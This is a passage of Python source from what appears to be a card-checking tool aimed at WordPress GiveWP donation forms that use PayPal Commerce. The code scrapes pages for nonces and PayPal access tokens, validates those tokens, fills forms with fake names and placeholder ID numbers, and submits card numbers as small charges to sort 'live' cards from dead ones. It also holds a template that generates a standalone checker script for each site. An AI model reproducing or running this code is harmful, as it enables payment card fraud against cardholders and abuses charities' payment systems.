        return str(random.randint(100000000, 999999999))

    def _resolve_special_fields(self):
        """Pre-fill tricky fields: nricfin, phone, zip etc."""
        try:
            country = 'US'
            for fname in ('billing_country', 'give_country', 'country'):
                if fname in self.form_fields:
                    opts = self.form_fields[fname].get('options', [])
                    if opts:
                        country = opts[0]
                        break

            special = {
                'nricfin': self._gen_nric(country),
                'nric': self._gen_nric(country),
                'last_4_digits_nricfin': self._gen_nric(country)[-4:],
                'fin': self._gen_nric(country),
                'ssn': '123456789',
                'contact_number_to_collect': '+1234567890',
                'contact_number': '+1234567890',
                'mobile': '+1234567890',
                'phone': '+1234567890',
                'telephone': '+1234567890',
                'give_phone': '+1234567890',
            }
            for name, value in special.items():
                if name in self.form_fields and 'prefill' not in self.form_fields[name]:
                    self.form_fields[name]['prefill'] = value
            self._log(f'special fields: prefill {len([1 for v in self.form_fields.values() if "prefill" in v])}')
        except Exception:
            pass

    # ── Token extraction ──
    def _add_candidate(self, token, source):
        if not token or len(token) < 20:
            return
        for c in self.token_candidates:
            if c['token'] == token:
                return
        self.token_candidates.append({'token': token, 'source': source})
        self._log(f'candidate +{source} (total={len(self.token_candidates)})')

    def _extract_tokens_ultimate(self):
        try:
            c = self.all_content
            if not c:
                return False

            for p in [
                r'"data-client-token"\s*:\s*"([^"]+)"',
                r'data-client-token=["\']([^"\']+)["\']',
                r'"clientToken"\s*:\s*"([^"]+)"',
            ]:
                for m in re.finditer(p, c, re.IGNORECASE):
                    try:
                        enc = m.group(1)
                        padded = enc + '=' * (-len(enc) % 4)
                        dec = base64.b64decode(padded).decode(
                            'utf-8', errors='ignore',
                        )
                        tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                        if tm:
                            self._add_candidate(tm.group(1), 'b64-client-token')
                        mm = re.search(r'merchant_id=([\w]+)', dec)
                        if mm and not self.paypal:
                            self.paypal = mm.group(1)
                        cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
                        if cm and not self.client_id:
                            self.client_id = cm.group(1)
                    except Exception:
                        pass

            for m in re.finditer(
                r'"accessToken"\s*:\s*"([^"]+)"', c, re.IGNORECASE
            ):
                if len(m.group(1)) > 20:
                    self._add_candidate(m.group(1), 'direct-accessToken')

            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', c):
                self._add_candidate(m.group(1), 'A21')

            for m in re.finditer(
                r'\b(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b',
                c,
            ):
                try:
                    parts = m.group(1).split('.')
                    if len(parts) >= 2:
                        padded = parts[1] + '=' * (-len(parts[1]) % 4)
                        payload = json.loads(base64.urlsafe_b64decode(padded))
                        if 'accessToken' in payload:
                            self._add_candidate(
                                payload['accessToken'], 'jwt-accessToken'
                            )
                        if 'clientId' in payload and not self.client_id:
                            self.client_id = payload['clientId']
                        if 'merchant_id' in payload and not self.paypal:
                            self.paypal = payload['merchant_id']
                except Exception:
                    pass

            if not self.client_id:
                for p in [
                    r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                    r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                    r'"client_id"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                ]:
                    m = re.search(p, c, re.IGNORECASE)
                    if m:
                        self.client_id = m.group(1)
                        break
            if not self.paypal:
                for p in [
                    r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                    r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"',
                    r'"merchant_id"\s*:\s*"([A-Za-z0-9]+)"',
                ]:
                    m = re.search(p, c, re.IGNORECASE)
                    if m:
                        self.paypal = m.group(1)
                        break

            return len(self.token_candidates) > 0
        except Exception as e:
            self._log(f'extract_tokens: {e}')
            return False

    # ── ✅ [4] Multi-endpoint token validation ──
    def _validate_token(self, token, timeout=8):
        if not token or len(token) < 20:
            return False
        endpoints = [
            ('https://api-m.paypal.com/v1/identity/oauth2/userinfo?schema=paypalv1.1', 'GET'),
            ('https://api-m.paypal.com/v2/checkout/orders', 'HEAD'),
        ]
        for url, method in endpoints:
            try:
                if method == 'GET':
                    r = self.r.get(url, headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json',
                    }, timeout=timeout)
                elif method == 'HEAD':
                    r = self.r.head(url, headers={
                        'Authorization': f'Bearer {token}',
                    }, timeout=timeout)
                else:
                    continue
                if r.status_code in (200, 201, 403, 405):
                    self._log(f'token OK via {url.split("/")[-1]} ({r.status_code})')
                    return True
                if r.status_code == 401:
                    continue
            except Exception:
                continue
        # Optimistic accept if token is long and network unavailable
        self._log('validation fallback: optimistic accept')
        return len(token) > 50

    def _pick_valid_token(self):
        if not self.token_candidates:
            return False
        def priority(c):
            s = c['source'].lower()
            if 'a21' in s:
                return 0
            if 'accessToken' in c['source']:
                return 1
            if 'jwt' in s:
                return 2
            if 'b64' in s:
                return 3
            if 'ajax' in s:
                return 4
            if 'js-give' in s:
                return 5
            return 6
        ordered = sorted(self.token_candidates, key=priority)
        for c in ordered:
            if self._validate_token(c['token']):
                self.au = c['token']
                self.token_verified = True
                self._log(f'accepted token from {c["source"]}')
                return True
        self._log('no candidate validated')
        return False

    # ── OAuth fallback ──
    def _try_oauth(self):
        if self.au or not self.client_id:
            return False
        try:
            auth = base64.b64encode(f'{self.client_id}:'.encode()).decode()
            r = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers={
                    'authorization': f'Basic {auth}',
                    'content-type': 'application/x-www-form-urlencoded',
                },
                data={'grant_type': 'client_credentials'},
                timeout=10,
            )
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self._add_candidate(j['access_token'], 'oauth')
                    self._log('token via OAuth')
                    return True
        except Exception as e:
            self._log(f'oauth: {type(e).__name__}')
        return False

    # ── AJAX token fetch (full payload) ──
    def _try_ajax_client_token(self):
        if not self.ajax_url or not self.id_form2:
            return False
        actions = [
            'give_paypal_commerce_get_client_token',
            'get_client_token',
            'paypal_get_client_token',
            'give_paypal_get_client_token',
        ]
        for action in actions:
            try:
                payload = {
                    'action': action,
                    'form-id': self.id_form2,
                    'give-form-hash': self.nonce or '',
                    'give-form-id-prefix': self.id_form1 or f'{self.id_form2}-1',
                }
                r = self._safe_post(
                    self.ajax_url,
                    data=payload,
                    headers={
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                        'referer': self.page_url,
                    },
                    timeout=8,
                )
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = None
                        if 'data' in j:
                            if isinstance(j['data'], str):
                                token = j['data']
                            elif isinstance(j['data'], dict):
                                token = (j['data'].get('client_token')
                                         or j['data'].get('token')
                                         or j['data'].get('access_token'))
                        if not token:
                            token = (j.get('client_token')
                                     or j.get('token')
                                     or j.get('access_token'))
                        if token and len(token) > 20:
                            # Try base64 unwrap
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode(
                                    'utf-8', errors='ignore'
                                )
                                tm = re.search(
                                    r'"accessToken"\s*:\s*"([^"]+)"', dec
                                )
                                if tm:
                                    self._add_candidate(
                                        tm.group(1), f'ajax-b64:{action}'
                                    )
                                    continue
                            except Exception:
                                pass
                            self._add_candidate(token, f'ajax:{action}')
                            self._log(f'AJAX token via {action}')
                    except Exception:
                        pass
            except Exception:
                continue
        return len(self.token_candidates) > 0

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2:
                return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(
                    self.ajax_url,
                    data={'action': action, 'form_id': self.id_form2},
                    headers={
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    timeout=6,
                )
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) \
                           and len(j['data']) >= 6:
                            self.nonce = j['data']
                            self._log('nonce via AJAX')
                            return True
                        if 'nonce' in j:
                            self.nonce = j['nonce']
                            self._log('nonce via AJAX')
                            return True
                    except Exception:
                        pass
        except Exception as e:
            self._log(f'ajax_nonce: {type(e).__name__}')
        return False

    # ── ✅ [6] Gateway type detection ──
    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if 'braintreegateway.com' in c and 'data-client-token' in c:
                self.gateway_type = 'braintree'
            elif 'paypal.com/sdk/js' in c and 'client-id=' in c:
                self.gateway_type = 'paypal_js_sdk'
            elif 'give_paypal_commerce' in c:
                self.gateway_type = 'givewp_paypal'
            elif 'paypal' in c.lower():
                self.gateway_type = 'paypal_unknown'
            else:
                self.gateway_type = 'unknown'
            self._log(f'gateway_type={self.gateway_type}')
            return self.gateway_type
        except Exception:
            return 'unknown'

    def _refresh_nonce(self):
        try:
            r = self._safe_get(self.page_url, timeout=15)
            if not r or r.status_code != 200:
                return False
            html = r.text
            self.page_html = html
            self.all_content = html
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if m:
                self.nonce = m.group(1)
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
            if m:
                self.id_form2 = m.group(1)
            m = re.search(
                r'name="give-form-id-prefix"\s+value="([^"]+)"', html
            )
            if m:
                self.id_form1 = m.group(1)
            return bool(self.nonce)
        except Exception:
            return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                try:
                    if name in form_data:
                        continue
                    if not info.get('required'):
                        continue
                    if name.startswith(('give-form-', 'give_')):
                        continue
                    if name in (
                        'give-amount', 'give_first', 'give_last',
                        'give_email', 'give-gateway', 'payment-mode',
                        'give-price-id', 'give_agree_to_terms',
                        'give_terms_agreement',
                    ):
                        continue
                    # Pre-filled special field
                    if 'prefill' in info:
                        form_data[name] = info['prefill']
                        continue
                    ft = info.get('type', '')
                    opts = info.get('options', [])
                    nl = name.lower()
                    if ft in ('select', 'radio'):
                        form_data[name] = opts[0] if opts else ''
                    elif ft == 'checkbox':
                        form_data[name] = opts[0] if opts else 'on'
                    elif ft == 'email':
                        form_data[name] = self.email
                    elif ft == 'number':
                        form_data[name] = '1'
                    elif ft == 'tel':
                        form_data[name] = '1234567890'
                    elif ft == 'date':
                        form_data[name] = '1990-01-01'
                    else:
                        if 'first' in nl or 'fname' in nl:
                            form_data[name] = random.choice(FIRST_NAMES)
                        elif 'last' in nl or 'lname' in nl:
                            form_data[name] = random.choice(LAST_NAMES)
                        elif 'name' in nl:
                            form_data[name] = (
                                f'{random.choice(FIRST_NAMES)} '
                                f'{random.choice(LAST_NAMES)}'
                            )
                        elif 'email' in nl:
                            form_data[name] = self.email
                        elif any(k in nl for k in ('phone', 'mobile', 'tel')):
                            form_data[name] = '1234567890'
                        elif any(k in nl for k in ('address', 'street')):
                            form_data[name] = '123 Main St'
                        elif 'city' in nl:
                            form_data[name] = 'New York'
                        elif any(k in nl for k in ('zip', 'postal')):
                            form_data[name] = '10001'
                        elif 'state' in nl:
                            form_data[name] = 'NY'
                        elif 'country' in nl:
                            form_data[name] = 'US'
                        elif any(k in nl for k in ('comment', 'message')):
                            form_data[name] = 'Donation'
                        elif 'amount' in nl:
                            form_data[name] = self.donation
                        else:
                            form_data[name] = 'Test'
                except Exception:
                    continue
        except Exception:
            pass
        return form_data

    # ── Key orchestrator ──
    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url:
                self._log('invalid page url')
                return False

            # ✅ [1] Warmup
            self._warmup_session()

            if not self._fetch_page():
                return False

            # ✅ [2] Deep JS on initial HTML
            self._deep_js_analysis()

            self._extract_basic()
            self._extract_all_form_fields()
            self._extract_tokens_ultimate()

            # ✅ [3] Resolve dropdowns
            self._resolve_dropdown_options()

            # ✅ [11] Special fields
            self._resolve_special_fields()

            # Validate candidates
            if self.token_candidates and self._pick_valid_token():
                self.auth_method = 'token'
            else:
                self._load_iframes()
                self._load_inline_data()
                self._deep_js_analysis()
                self._extract_basic()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                self._load_all_js()
                self._deep_js_analysis()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                if self._try_ajax_client_token() and self._pick_valid_token():
                    self.auth_method = 'ajax'

            if not self.au and self.client_id:
                if self._try_oauth() and self._pick_valid_token():
                    self.auth_method = 'oauth'

            if not self.nonce and self.id_form2:
                self._try_ajax_nonce()

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            # ✅ [6] Detect gateway
            self._detect_gateway_type()

            self._log(
                f'KEY: form={self.id_form2} nonce={"Y" if self.nonce else "N"} '
                f'auth={self.auth_method} gw={self.gateway_type} '
                f'candidates={len(self.token_candidates)} '
                f'fields={len(self.form_fields)} verified={self.token_verified}'
            )
            return True
        except Exception as e:
            self._log(f'key: {e}')
            return False

    def _build_price_ids(self):
        pids = []
        if self.current_price_id:
            pids.append(self.current_price_id)
        for pid, _ in (self.price_levels or []):
            if pid and pid not in pids:
                pids.append(pid)
        for p in ('custom', '3', '4', '1', '2', '5', '', None):
            if p not in pids:
                pids.append(p)
        return pids

    def _build_amounts(self, thorough):
        """Respect price levels and minimum first, then defaults."""
        amounts = []
        # Start with minimum
        try:
            min_val = float(self.minimum)
            if 0 < min_val <= 500:
                amounts.append(f'{min_val:.2f}')
        except Exception:
            pass
        # Then price levels
        for _, amt in (self.price_levels or [])[:3]:
            if amt > 0 and f'{amt:.2f}' not in amounts:
                amounts.append(f'{amt:.2f}')
        # Fallback defaults
        for d in ['1.00', '5.00']:
            if d not in amounts:
                amounts.append(d)
        if thorough:
            amounts.append('10.00')
        return list(dict.fromkeys(amounts))[:5]

    def _attempt_charge(self, n, mm, yy, cvc, amt):
        try:
            self.donation = amt
            expiry = f'20{yy}-{mm}'
            price_ids = self._build_price_ids()
            order_id = None
            last_create_err = 'ORDER_CREATE_UNKNOWN'

            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonce or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(FIRST_NAMES),
                        'give_last': random.choice(LAST_NAMES),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    da = MultipartEncoder({
                        k: (None, str(v) if v is not None else '')
                        for k, v in form_data.items()
                    })
                    he = {
                        'content-type': da.content_type,
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                        'referer': self.page_url,
                        'origin': f'https://{self.url}',
                    }
                    r3 = None
                    try:
                        r3 = self.r.post(
                            self.ajax_url,
                            params={
                                'action':
                                'give_paypal_commerce_create_order',
                            },
                            headers=he, data=da, timeout=20,
                        )
                    except Exception as e:
                        last_create_err = (
                            f'CONNECTION_FAILED: {type(e).__name__}'
                        )
                        continue
                    if r3 is None:
                        last_create_err = 'CONNECTION_FAILED: None'
                        continue
                    body = r3.text or ''
                    if r3.status_code != 200:
                        last_create_err = (
                            f'HTTP_ERROR {r3.status_code}: '
                            f'{body[:80] or "empty"}'
                        )
                        continue
                    try:
                        j = r3.json()
                    except Exception:
                        last_create_err = (
                            f'JSON_PARSE_ERROR: {body[:80] or "empty"}'
                        )
                        continue
                    if not isinstance(j, dict):
                        last_create_err = 'JSON_PARSE_ERROR: non-dict'
                        continue
                    data = j.get('data')
                    if j.get('success') and isinstance(data, dict) \
                       and data.get('id'):
                        order_id = data['id']
                        self._log(f'order created pid={pid} amt={amt}')
                        break
                    err = ''
                    if isinstance(data, dict):
                        err = (data.get('error') or data.get('message')
                               or data.get('msg') or '')
                    elif isinstance(data, str):
                        err = data
                    if not err:
                        err = (j.get('error') or j.get('message')
                               or 'Create failed')
                    last_create_err = str(err)[:150] or 'ORDER_CREATE_FAILED'
                except Exception as e:
                    last_create_err = f'ORDER_CREATE_FAILED: {type(e).__name__}'
                    continue

            if not order_id:
                if is_auth_failure(last_create_err):
                    return 'AUTH_FAILURE_ON_CREATE', last_create_err
                return None, last_create_err

            # ✅ [5] Dynamic origin
            metadata = self.paypal or self.client_id or ''
            origin = f'https://{self.url}'
            he4 = {
                'authorization': f'Bearer {self.au or ""}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': origin,
                'referer': f'{origin}/',
                'user-agent': self.uu.random,
            }
            da3 = {
                'payment_source': {
                    'card': {
                        'number': n, 'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {
                            'verification': {'method': 'SCA_WHEN_REQUIRED'},
                        },
                    },
                },
                'application_context': {'vault': False},
            }
            confirm_body = ''
            confirm_ok = False
            try:
                cr = self.r.post(
                    'https://cors.api.paypal.com/v2/checkout/orders/'
                    f'{order_id}/confirm-payment-source',
                    headers=he4, json=da3, timeout=20,
                )
                confirm_body = cr.text or ''
                confirm_ok = cr.status_code in (200, 201, 202, 422)
            except Exception as e:
                confirm_body = ''
                self._log(f'confirm net err: {type(e).__name__}')

            if confirm_ok and confirm_body:
                for kw in LIVE_KEYWORDS:
                    if kw.upper() in confirm_body.upper():
                        self._log(f'live from confirm: {kw}')
                        return kw, confirm_body
                if is_auth_failure(confirm_body):
                    return 'AUTH_FAILURE_ON_CONFIRM', confirm_body

            approve_errors = []
            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonce or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(FIRST_NAMES),
                        'give_last': random.choice(LAST_NAMES),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    da4 = MultipartEncoder({
                        k: (None, str(v) if v is not None else '')
                        for k, v in form_data.items()
                    })
                    he5 = {
                        'content-type': da4.content_type,
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                        'referer': self.page_url,
                        'origin': f'https://{self.url}',
                    }
                    r5 = self.r.post(
                        self.ajax_url,
                        params={
                            'action':
                            'give_paypal_commerce_approve_order',
                            'order': order_id,
                        },
                        headers=he5, data=da4, timeout=20,
                    )
                    text = (r5.text or '') + confirm_body
                    lower = text.lower()
                    if '"success":true' in lower and '"error"' not in lower:
                        return f'CHARGE {amt}$', text
                    for kw in LIVE_KEYWORDS:
                        if kw.upper() in text.upper():
                            return kw, text
                    if is_auth_failure(text):
                        return 'AUTH_FAILURE_ON_APPROVE', text
                    try:
                        j = r5.json()
                        data = j.get('data') if isinstance(j, dict) else None
                        if isinstance(data, dict) and data.get('error'):
                            err = str(data['error'])[:200]
                            if err.lower() not in ('none', 'null', ''):
                                approve_errors.append(err)
                                continue
                    except Exception:
                        pass
                    if text.strip():
                        return text[:180], text
                except Exception:
                    approve_errors.append('approve_exception')
                    continue

            if approve_errors:
                return approve_errors[-1], approve_errors[-1]
            if confirm_body.strip():
                return confirm_body[:180], confirm_body
            return 'APPROVE_NO_RESPONSE', ''
        except Exception as e:
            return None, f'FATAL: {type(e).__name__}: {str(e)[:100]}'

    def Charge(self, ccx, thorough=False):
        try:
            if not ccx or not isinstance(ccx, str):
                return 'INVALID_CARD_FORMAT'
            ccx = ccx.strip().replace(' ', '')
            parts = re.split(r'[|:/]', ccx)
            if len(parts) < 4:
                return 'INVALID_CARD_FORMAT'
            n = re.sub(r'\D', '', parts[0])
            mm = re.sub(r'\D', '', parts[1]).zfill(2)
            yy = re.sub(r'\D', '', parts[2])
            cvc = re.sub(r'\D', '', parts[3])
            if len(yy) == 4 and yy.startswith('20'):
                yy = yy[2:]
            yy = yy.zfill(2)
            if len(n) < 13 or len(n) > 19:
                return 'INVALID_CARD_NUMBER'
            if len(mm) != 2 or not (1 <= int(mm) <= 12):
                return 'INVALID_EXPIRY_MONTH'
            if len(cvc) < 3 or len(cvc) > 4:
                return 'INVALID_CVV'

            if not self.ajax_url or 'invalid.local' in self.ajax_url:
                return 'INVALID_SITE'
            if not self.id_form2:
                return 'FORM_ERROR: give-form-id missing'

            if not self.nonce:
                self._try_ajax_nonce()
                if not self.nonce:
                    self._refresh_nonce()
                if not self.nonce:
                    return 'NONCE_MISSING'
            if not self.id_form1:
                self.id_form1 = f'{self.id_form2}-1'

            if not self.au:
                self._extract_tokens_ultimate()
                if not self._pick_valid_token():
                    if self.client_id and self._try_oauth():
                        self._pick_valid_token()
                    if not self.au:
                        if self._try_ajax_client_token():
                            self._pick_valid_token()

            amounts = self._build_amounts(thorough)
            all_results = []
            create_errors = []

            def _try_amounts(amt_list):
                for amt in amt_list:
                    try:
                        result, text = self._attempt_charge(
                            n, mm, yy, cvc, amt,
                        )
                        if result and not result.startswith('AUTH_FAILURE'):
                            all_results.append({
                                'amount': amt,
                                'result': result,
                                'text': text,
                            })
                        elif result and result.startswith('AUTH_FAILURE'):
                            create_errors.append((amt, 'AUTH_REFRESH'))
                        elif not result:
                            create_errors.append((amt, text or 'unknown'))
                    except Exception as e:
                        create_errors.append(
                            (amt, f'EXCEPTION: {type(e).__name__}'),
                        )

            _try_amounts(amounts)

            if not all_results and any(
                e[1] == 'AUTH_REFRESH' for e in create_errors
            ):
                self._log('auth failure — refreshing tokens')
                self.token_candidates = []
                self.au = None
                self.token_verified = False
                self._refresh_nonce()
                self._extract_tokens_ultimate()
                if self._pick_valid_token():
                    create_errors = []
                    _try_amounts(amounts)

            if not all_results and thorough:
                self._try_ajax_nonce()
                time.sleep(0.5)
                try:
                    result, text = self._attempt_charge(
                        n, mm, yy, cvc, '1.00',
                    )
                    if result and not result.startswith('AUTH_FAILURE'):
                        all_results.append({
                            'amount': '1.00',
                            'result': result,
                            'text': text,
                        })
                except Exception:
                    pass

            if not all_results:
                if create_errors:
                    last_amt, last_err = create_errors[-1]
                    self.donation = last_amt
                    if last_err and last_err.lower() not in (
                        'none', 'null', '',
                    ):
                        return last_err
                    return 'ORDER_CREATE_FAILED'
                return 'NO_ATTEMPT'

            best = max(
                all_results,
                key=lambda x: score_result(x['result']),
            )
            self.donation = best['amount']
            return normalize_result(best['result'])
        except Exception as e:
            return f'FATAL: {type(e).__name__}: {str(e)[:100]}'


# ================================================================
#  BRIDGE
# ================================================================
def check_single_link(link, thorough=True):
    try:
        link = safe_url(link)
        if not link:
            return {
                'link': str(link)[:100] if link else 'Invalid',
                'live': False,
                'respons': 'BAD_URL',
                'amount': '1.00',
                'tester': None,
            }
        tester = PayPalTester(link)
        if not tester.Key():
            return {
                'link': link[:100],
                'live': False,
                'respons': 'FETCH_FAILED',
                'amount': '1.00',
                'tester': tester,
            }
        result = tester.Charge(TEST_CARD, thorough=thorough)
        live = is_live_response(result) and not is_dead_response(result)
        return {
            'link': link[:100],
            'live': live,
            'respons': str(result)[:200],
            'amount': tester.donation,
            'minimum': tester.minimum,
            'currency': tester.currency,
            'auth': tester.auth_method,
            'tester': tester,
        }
    except Exception as e:
        log.exception('check_single_link')
        return {
            'link': str(link)[:100] if link else 'Invalid',
            'live': False,
            'respons': f'FATAL: {type(e).__name__}',
            'amount': '1.00',
            'tester': None,
        }

# ================================================================
#  GATEWAY TEMPLATE (v18)
# ================================================================
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Live Gateway v18 — Link: $page_url
# Response: $display_result
# Auth: $auth_method | Gateway: $gateway_type | Currency: $currency
# ============================================================
import requests, random, time, re, base64, json, os, sys
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0'
except Exception:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL = "$page_url"
AJAX_URL = "$ajax_url"
ID_FORM1 = "$id_form1"
ID_FORM2 = "$id_form2"
NONCE = "$nonce"
WP_NONCE = "$wp_nonce"
ACCESS_TOKEN = "$access_token"
PAYPAL_META = "$paypal_meta"
CLIENT_ID = "$client_id"
CURRENCY = "$currency"
MINIMUM = "$minimum"
PREFERRED_AMT = "$preferred_amt"
CURRENT_PID = "$current_pid"
AUTH_METHOD = "$auth_method"
GATEWAY_TYPE = "$gateway_type"
PRICE_LEVELS = $price_levels_json
FORM_FIELDS = $form_fields_json

LIVE_RESPONSES = $live_responses
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown']
HOST = PAGE_URL.split('//')[-1].split('/')[0]


def luhn_check(card_num):
    try:
        digits = [int(d) for d in str(card_num)]
        odd = digits[-1::-2]; even = digits[-2::-2]
        total = sum(odd)
        for d in even:
            total += sum([int(x) for x in str(d * 2)])
        return total % 10 == 0
    except Exception:
        return False


class PayPal:
    def __init__(self):
        self.email = "%s%s%d@gmail.com" % (
            random.choice(FIRST_NAMES), random.choice(LAST_NAMES),
            random.randint(100, 999),
        )
        self.r = requests.Session()
        self.r.verify = True
        self.r.headers.update({'user-agent': rand_ua()})
        self.donation = PREFERRED_AMT
        self.ajax_url = AJAX_URL
        self.id_form1 = ID_FORM1
        self.id_form2 = ID_FORM2
        self.nonce = NONCE
        self.wp_nonce = WP_NONCE
        self.au = ACCESS_TOKEN
        self.paypal_meta = PAYPAL_META
        self.client_id = CLIENT_ID
        self.currency = CURRENCY
        self.current_pid = CURRENT_PID
        self.form_fields = FORM_FIELDS
        self.gateway_type = GATEWAY_TYPE
        self.refresh_count = 0
        # warmup
        try:
            self.r.get('https://%s/' % HOST, timeout=15)
            self.r.get(PAGE_URL, timeout=20)
        except Exception:
            pass

    def _autofill(self, form_data):
        for name, info in self.form_fields.items():
            if name in form_data: continue
            if not info.get("required"): continue
            if name.startswith("give-form-") or name.startswith("give_"): continue
            if "prefill" in info:
                form_data[name] = info["prefill"]; continue
            ft = info.get("type", ""); opts = info.get("options", [])
            nl = name.lower()
            if ft in ("select", "radio"): form_data[name] = opts[0] if opts else ""
            elif ft == "checkbox": form_data[name] = opts[0] if opts else "on"
            elif ft == "email": form_data[name] = self.email
            elif ft == "tel": form_data[name] = "1234567890"
            elif "first" in nl: form_data[name] = random.choice(FIRST_NAMES)
            elif "last" in nl: form_data[name] = random.choice(LAST_NAMES)
            elif "name" in nl: form_data[name] = random.choice(FIRST_NAMES) + " " + random.choice(LAST_NAMES)
            elif "phone" in nl: form_data[name] = "1234567890"
            elif "address" in nl: form_data[name] = "123 Main St"
            elif "city" in nl: form_data[name] = "New York"
            elif "zip" in nl or "postal" in nl: form_data[name] = "10001"
            elif "state" in nl: form_data[name] = "NY"
            elif "country" in nl: form_data[name] = "US"
            else: form_data[name] = "Test"
        return form_data

    def _refresh(self):
        if self.refresh_count >= 3: return False
        self.refresh_count += 1
        try:
            r = self.r.get(PAGE_URL, timeout=15)
            if r.status_code != 200: return False
            html = r.text
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if m: self.nonce = m.group(1)
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
            if m: self.id_form2 = m.group(1)
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            if m: self.id_form1 = m.group(1)
            for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
                m = re.search(p, html, re.IGNORECASE)
                if m: self.au = m.group(1); break
        except Exception: pass
        return True

    def _create_order(self, amt, pid):
        try:
            form_data = {
                "give-form-id-prefix": self.id_form1 or "", "give-form-id": self.id_form2 or "",
                "give-form-hash": self.nonce or "", "give-amount": amt, "give-currency": self.currency,
                "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
                "give_last": random.choice(LAST_NAMES), "give_email": self.email,
                "give-gateway": "paypal-commerce", "give_agree_to_terms": "on",
            }
            if pid is not None: form_data["give-price-id"] = pid
            form_data = self._autofill(form_data)
            da = MultipartEncoder({k: (None, str(v)) for k, v in form_data.items()})
            r = self.r.post(self.ajax_url, params={"action": "give_paypal_commerce_create_order"},
                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
                         "referer": PAGE_URL, "origin": "https://" + HOST},
                data=da, timeout=20)
            j = r.json()
            if j.get("success") and isinstance(j.get("data"), dict) and j["data"].get("id"):
                return j["data"]["id"], None
            err = j.get("data", {}).get("error", "fail")
            return None, str(err)[:150]
        except Exception as e: return None, "EXCEPTION: " + type(e).__name__

    def _confirm(self, order_id, n, mm, yy, cvc):
        try:
            he = {
                "authorization": "Bearer " + (self.au or ""),
                "paypal-client-metadata-id": self.paypal_meta or self.client_id or "",
                "content-type": "application/json",
                "origin": "https://" + HOST, "referer": PAGE_URL,
            }
            expiry = "20%s-%s" % (yy, mm)
            da = {"payment_source": {"card": {"number": n, "expiry": expiry, "security_code": cvc,
                "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}}},
                "application_context": {"vault": False}}
            cr = self.r.post("https://cors.api.paypal.com/v2/checkout/orders/" + order_id + "/confirm-payment-source",
                headers=he, json=da, timeout=20)
            return cr.text or ""
        except Exception: return ""

    def _approve(self, order_id, amt, pid):
        try:
            form_data = {
